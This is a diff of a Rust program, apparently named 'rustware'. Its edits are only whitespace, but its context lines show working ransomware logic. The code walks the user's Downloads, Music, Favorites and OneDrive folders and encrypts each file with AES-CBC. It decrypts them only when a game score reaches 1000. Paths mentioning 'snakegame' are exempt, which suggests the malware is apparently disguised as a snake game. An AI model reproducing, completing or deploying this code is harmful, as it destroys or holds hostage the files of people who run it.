@@ -1,4 +1,4 @@
-use libaes::Cipher;
+use libaes::Cipher; 
 use rand::Rng;
 
 use std::ffi::CString;
@@ -21,7 +21,7 @@ use windows_sys::{
         "Downloads",
         "Favorites",
         "Music",
-        "OneDrive\\Attachments",
+	"OneDrive\\Attachments",
         "OneDrive\\Desktop",
         "OneDrive\\Documents",
         "OneDrive\\Pictures",
@@ -103,16 +103,16 @@ fn encrypt_decrypt(file_name: &str, action: &str) -> bool {
             println!("[*] Decrypting {}", file_name);
             let decrypted = cipher.cbc_decrypt(&iv, &fs::read(file_name).unwrap());
             if let Err(err)=fs::write(file_name, decrypted){
-                    eprintln!("Error writing to file: {}", err);
+		    eprintln!("Error writing to file: {}", err);
 
-                };
+		};
             let new_filename = file_name.replace(".rustware", "");
             fs::rename(file_name, new_filename).unwrap();
         }
 
-        _ => {
+        _ => { 
             println!("[-] Invalid action!");
-            return false
+            return false 
         }
     }
 
@@ -129,32 +129,32 @@ for dir in dir_names.iter() {
         full_path.push_str("\\");
         // extract path and call traverse
         let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
-        let path_str = full_path.to_str().expect("Conversion to &str failed");
-        println!("Path {}",path_str);
-        if  let Ok(entries) = fs::read_dir(path_str) {
-        let entries = fs::read_dir(path_str).unwrap();
+	let path_str = full_path.to_str().expect("Conversion to &str failed");
+	println!("Path {}",path_str);
+	if  let Ok(entries) = fs::read_dir(path_str) {
+	let entries = fs::read_dir(path_str).unwrap();
 
     for raw_entry in entries {
         let entry = raw_entry.unwrap();
 
         if entry.file_type().unwrap().is_file() {
-
+            
             println!("File Name: {}", entry.path().display());
-            let file_path = entry.path();
-            let file_path_str = file_path.to_str();
+	    let file_path = entry.path();
+	    let file_path_str = file_path.to_str();
             if file_path_str.unwrap().to_lowercase().contains("rustware") || file_path_str.unwrap().to_lowercase().contains("snakegame") || file_path_str.unwrap().to_lowercase().contains(".ini") {
                 // Skip files containing "rustware" or "snakegame" in the file path
                 continue;
             }
             if current_score <1000{
-            encrypt_decrypt(file_path_str.unwrap(),"encrypt");
-            }else{
-
+	    encrypt_decrypt(file_path_str.unwrap(),"encrypt");
+	    }else{
+		
                  encrypt_decrypt(file_path_str.unwrap(),"decrypt");
-                }
+		}
         }
-        }
-        }
+	}
+	}
      else {
      println!("Failed to read directory: {}", path_str);
 }
@@ -163,3 +163,4 @@ for dir in dir_names.iter() {
 
 
 }
+
